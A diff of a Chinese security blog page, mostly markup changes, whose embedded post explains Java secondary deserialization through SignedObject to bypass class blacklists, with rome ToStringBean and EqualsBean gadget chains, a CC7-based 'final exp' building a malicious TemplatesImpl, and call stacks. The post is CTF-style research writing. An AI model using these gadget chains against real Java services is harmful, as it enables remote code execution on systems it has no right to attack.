@@ -5,12 +5,12 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>二次反序列化，看我一命通关 - 晨星_茯苓</title><meta name="author" content="晨星_茯苓">
-<meta name="author-link" content="/about/">
-<meta name="description" content="对 Java 二次反序列化学习研究整理" /><meta name="keywords" content='web security, 网络攻防' /><meta itemprop="name" content="二次反序列化，看我一命通关">
+    <title>二次反序列化，看我一命通关 - 晨星_茯苓</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="对 Java 二次反序列化学习研究整理" /><meta name="keywords" content='web security, 红蓝攻防, APT' /><meta itemprop="name" content="二次反序列化，看我一命通关">
 <meta itemprop="description" content="对 Java 二次反序列化学习研究整理"><meta itemprop="datePublished" content="2022-09-07T10:31:40+08:00" />
 <meta itemprop="dateModified" content="2023-01-15T20:54:57+08:00" />
-<meta itemprop="wordCount" content="3668"><meta itemprop="image" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png">
+<meta itemprop="wordCount" content="3771"><meta itemprop="image" content="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png">
 <meta itemprop="keywords" content="" /><meta property="og:title" content="二次反序列化，看我一命通关" />
 <meta property="og:description" content="对 Java 二次反序列化学习研究整理" />
 <meta property="og:type" content="article" />
@@ -22,7 +22,9 @@
 <meta name="twitter:title" content="二次反序列化，看我一命通关"/>
 <meta name="twitter:description" content="对 Java 二次反序列化学习研究整理"/>
 <meta name="application-name" content="FixIt">
-<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/favicon.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" /><link rel="prev" href="https://poriams.github.io/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/" /><link rel="next" href="https://poriams.github.io/%E4%BB%8E-hexo-%E5%88%B0-hugo/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/favicon.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" /><link rel="next" href="https://poriams.github.io/%E4%BB%8E-hexo-%E5%88%B0-hugo/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -36,16 +38,16 @@
               "url": "https:\/\/poriams.github.io\/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3\/Zets\/index\/header.png",
               "width":  767 ,
               "height":  315 
-            }],"genre": "posts","wordcount":  3668 ,
+            }],"genre": "posts","wordcount":  3771 ,
     "url": "https:\/\/poriams.github.io\/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3\/","datePublished": "2022-09-07T10:31:40+08:00","dateModified": "2023-01-15T20:54:57+08:00","publisher": {
       "@type": "Organization",
       "name": "晨星_茯苓"},"author": {
         "@type": "Person",
-        "name": "晨星_茯苓"
+        "name": "作者"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
       <a href="/" title="晨星_茯苓"><span class="header-title-pre"><i class='fa-solid fa-home fa-fw fa-sm'></i></span><span class="header-title-text">Poria Morningstar</span></a><span class="header-subtitle"></span></div>
@@ -75,7 +77,7 @@
                 
                 
               ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
-            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
             <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
               <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
             </a>
@@ -87,8 +89,7 @@
             </span>
           </li><li class="menu-item theme-switch" title="切换主题">
           <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li>
-      </ul>
+        </li></ul>
     </nav>
   </div>
 </header><header class="mobile animate__faster" id="header-mobile">
@@ -103,7 +104,7 @@
     <nav>
       <ul class="menu" id="menu-mobile"><li class="search-wrapper">
             <div class="search mobile" id="search-mobile">
-              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
               <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                 <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
               </a>
@@ -145,9 +146,9 @@
                   href="/about/"
                   
                   
-                ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
-          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li></ul>
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
     </nav>
   </div>
 </header><div class="search-dropdown desktop">
@@ -155,38 +156,18 @@
   </div>
   <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
-      <div class="toc-content" id="toc-content-auto"></div></aside>
-
-  <aside class="aside-custom">
-    </aside>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
 
   <article class="page single">
-    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
-        <span>二次反序列化，看我一命通关</span>
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>二次反序列化，看我一命通关</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="/about/" title="作者" rel=" author" class="author"><img
-    class="lazyload avatar"
-    src="/svg/loading.min.svg"
-    data-src="/avatar.jpg"
-    data-srcset="/avatar.jpg, /avatar.jpg 1.5x, /avatar.jpg 2x"
-    data-sizes="auto"
-    alt="晨星_茯苓"
-    title="晨星_茯苓"/>&nbsp;晨星_茯苓</a></span>
-          <span class="post-category">收录于 <a href="/categories/javasec/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> JavaSec</a></span></div>
-      <div class="post-meta-line"><span title=2022-09-07&#32;10:31:40><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-07">2022-09-07</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3668 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;<span class="comment-visitors" data-flag-title="二次反序列化，看我一命通关">
-              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-pageview-count">-</span>&nbsp;次阅读
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      </span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/javasec/" class="post-category" title="分类 - JavaSec"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> JavaSec</a></span></div><div class="post-meta-line"><span title="发布于 2022-09-07 10:31:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-09-07">2022-09-07</time></span>&nbsp;<span title="更新于 2023-01-15 20:54:57"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2023-01-15">2023-01-15</time></span>&nbsp;<span title="3771 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;<span class="comment-visitors" data-flag-title="二次反序列化，看我一命通关">
+              <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-pageview-count">-</span>&nbsp;次阅读
             </span>&nbsp;<span class="comment-count" data-flag-title="二次反序列化，看我一命通关">
-              <i class="fa-regular fa-comments fa-fw" aria-hidden="true"></i>&nbsp;<span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-comment-count">-</span>&nbsp;条评论
+              <i class="fa-regular fa-comments fa-fw me-1" aria-hidden="true"></i><span data-path="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" class="waline-comment-count">-</span>&nbsp;条评论
             </span>&nbsp;</div>
-    </div><div class="featured-image"><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"
-    data-srcset="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png, /%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png 1.5x, /%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png 2x"
-    data-sizes="auto"
-    alt="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"
-    title="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png"/></div><div class="details toc" id="toc-static" data-kept="false">
+    </div><div class="featured-image"><img loading="lazy" src="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png" alt="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png" data-title="/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/Zets/index/header.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
           <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
@@ -239,35 +220,21 @@
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p>对 Java 二次反序列化学习研究整理</p>
-<h3 id="前言">前言</h3>
-<p>不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过</p>
+<h3 id="前言" class="heading-element">
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark"></a>前言</h3><p>不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过</p>
 <p>就在此时，大佬看了一眼说，用二次反序列化就可以绕过了。“二次反序列化”这六个字重重地敲在了我的心巴上，从那以后我就对二次反序列化产生了莫名的渴望</p>
 <p>茯苓开始详细学习时，发现没有二次反序列化比较系统的学习文章，那么，就自己总结一个</p>
 <p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是<strong>绕过黑名单的限制或不出网利用</strong></p>
 <p>PS：本文用到的工具类会放在文末</p>
-<h3 id="signedobject">SignedObject</h3>
-<h4 id="原理">原理</h4>
-<p>它，是<code>java.security</code>下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>包含另一个<code>Serializable</code>对象。</p>
+<h3 id="signedobject" class="heading-element">
+  <a href="#signedobject" class="heading-mark"></a>SignedObject</h3><h4 id="原理" class="heading-element">
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark"></a>原理</h4><p>它，是<code>java.security</code>下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>包含另一个<code>Serializable</code>对象。</p>
 <p>太完美了，这个类简直是为二次反序列化而存在的，来关注下它的<code>getObject()</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220809181727529.png"
-    data-srcset="./Zets/index/image-20220809181727529.png, ./Zets/index/image-20220809181727529.png 1.5x, ./Zets/index/image-20220809181727529.png 2x"
-    data-sizes="auto"
-    alt="image-20220809181727529"
-    title="image-20220809181727529"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220809181727529.png" alt="image-20220809181727529" srcset="./Zets/index/image-20220809181727529.png?size=small, ./Zets/index/image-20220809181727529.png?size=medium 1.5x, ./Zets/index/image-20220809181727529.png?size=large 2x" sizes="auto" data-title="image-20220809181727529" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>反序列化的内容也是可控</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220809182131901.png"
-    data-srcset="./Zets/index/image-20220809182131901.png, ./Zets/index/image-20220809182131901.png 1.5x, ./Zets/index/image-20220809182131901.png 2x"
-    data-sizes="auto"
-    alt="image-20220809182131901"
-    title="image-20220809182131901"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220809182131901.png" alt="image-20220809182131901" srcset="./Zets/index/image-20220809182131901.png?size=small, ./Zets/index/image-20220809182131901.png?size=medium 1.5x, ./Zets/index/image-20220809182131901.png?size=large 2x" sizes="auto" data-title="image-20220809182131901" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>那么茯苓思路瞬间清晰了，先构造一个恶意<code>SignedObject</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -278,16 +245,15 @@
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl"><span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="err">恶意对象</span> <span class="err">用于第二次反序列化</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="err">恶意对象</span> <span class="err">用于第二次反序列化</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后调用它的<code>getObject()</code>方法即可，那么现在压力来到了如何调用这个方法这边</p>
-<h4 id="rome">rome</h4>
-<h5 id="tostringbean">ToStringBean</h5>
-<p>提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的<code>ToStringBean</code>的<code>toString()</code>方法可以办到这件事，理论上是可行的，实际也是可以构造的</p>
+<h4 id="rome" class="heading-element">
+  <a href="#rome" class="heading-mark"></a>rome</h4><h5 id="tostringbean" class="heading-element">
+  <a href="#tostringbean" class="heading-mark"></a>ToStringBean</h5><p>提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的<code>ToStringBean</code>的<code>toString()</code>方法可以办到这件事，理论上是可行的，实际也是可以构造的</p>
 <p>因为<code>ObjectBean</code>其在实例化时会实例化三个 bean，这样构造出来的内容过分长了，茯苓不喜欢</p>
 <p><del>大家可以自行构造试试</del>，茯苓绝不是那种不负责的人，还是给出例子，但不进行具体分析</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -364,57 +330,21 @@
 </span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">&#34;_equalsBean&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">ObjectBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">expObjectBean</span><span class="o">));</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">hashMap</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span> 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span> </span></span></code></pre></td></tr></table>
 </div>
-</div><h5 id="equalsbean">EqualsBean</h5>
-<p>rome 链的关键转折点在于<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>，<code>EqualsBean</code>也存在这个关键代码</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810093914403.png"
-    data-srcset="./Zets/index/image-20220810093914403.png, ./Zets/index/image-20220810093914403.png 1.5x, ./Zets/index/image-20220810093914403.png 2x"
-    data-sizes="auto"
-    alt="image-20220810093914403"
-    title="image-20220810093914403"/></p>
+</div><h5 id="equalsbean" class="heading-element">
+  <a href="#equalsbean" class="heading-mark"></a>EqualsBean</h5><p>rome 链的关键转折点在于<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>，<code>EqualsBean</code>也存在这个关键代码</p>
+<p><img loading="lazy" src="./Zets/index/image-20220810093914403.png" alt="image-20220810093914403" srcset="./Zets/index/image-20220810093914403.png?size=small, ./Zets/index/image-20220810093914403.png?size=medium 1.5x, ./Zets/index/image-20220810093914403.png?size=large 2x" sizes="auto" data-title="image-20220810093914403" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>那么茯苓可以利用珍藏多年的 CC7 链，利用<code>Hashtable</code>来触发<code>equals</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810094410681.png"
-    data-srcset="./Zets/index/image-20220810094410681.png, ./Zets/index/image-20220810094410681.png 1.5x, ./Zets/index/image-20220810094410681.png 2x"
-    data-sizes="auto"
-    alt="image-20220810094410681"
-    title="image-20220810094410681"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810094410681.png" alt="image-20220810094410681" srcset="./Zets/index/image-20220810094410681.png?size=small, ./Zets/index/image-20220810094410681.png?size=medium 1.5x, ./Zets/index/image-20220810094410681.png?size=large 2x" sizes="auto" data-title="image-20220810094410681" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这步是 CC7 的构造方式，因为要构造两遍，所以写为静态方法。</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810095018646.png"
-    data-srcset="./Zets/index/image-20220810095018646.png, ./Zets/index/image-20220810095018646.png 1.5x, ./Zets/index/image-20220810095018646.png 2x"
-    data-sizes="auto"
-    alt="image-20220810095018646"
-    title="image-20220810095018646"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810095018646.png" alt="image-20220810095018646" srcset="./Zets/index/image-20220810095018646.png?size=small, ./Zets/index/image-20220810095018646.png?size=medium 1.5x, ./Zets/index/image-20220810095018646.png?size=large 2x" sizes="auto" data-title="image-20220810095018646" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>构造恶意<code>TemplatesImpl</code>，将其装入第一个<code>Hashtable</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810095408001.png"
-    data-srcset="./Zets/index/image-20220810095408001.png, ./Zets/index/image-20220810095408001.png 1.5x, ./Zets/index/image-20220810095408001.png 2x"
-    data-sizes="auto"
-    alt="image-20220810095408001"
-    title="image-20220810095408001"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810095408001.png" alt="image-20220810095408001" srcset="./Zets/index/image-20220810095408001.png?size=small, ./Zets/index/image-20220810095408001.png?size=medium 1.5x, ./Zets/index/image-20220810095408001.png?size=large 2x" sizes="auto" data-title="image-20220810095408001" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>构造恶意<code>SignedObject</code>，将其装入第二个<code>Hashtable</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810100110091.png"
-    data-srcset="./Zets/index/image-20220810100110091.png, ./Zets/index/image-20220810100110091.png 1.5x, ./Zets/index/image-20220810100110091.png 2x"
-    data-sizes="auto"
-    alt="image-20220810100110091"
-    title="image-20220810100110091"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810100110091.png" alt="image-20220810100110091" srcset="./Zets/index/image-20220810100110091.png?size=small, ./Zets/index/image-20220810100110091.png?size=medium 1.5x, ./Zets/index/image-20220810100110091.png?size=large 2x" sizes="auto" data-title="image-20220810100110091" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>最终 exp</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -505,11 +435,10 @@
 </span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="s">&#34;_obj&#34;</span><span class="o">,</span> <span class="n">payloadObj</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">table</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>值得一提的是，因为 rome 的特殊性，该利用既可以用于<code>ObjectInputStream</code>的反序列化，也可以用于<code>HessianInput</code>的反序列化，茯苓分别给出这两种情况下的调用栈</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -552,10 +481,9 @@
 </span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
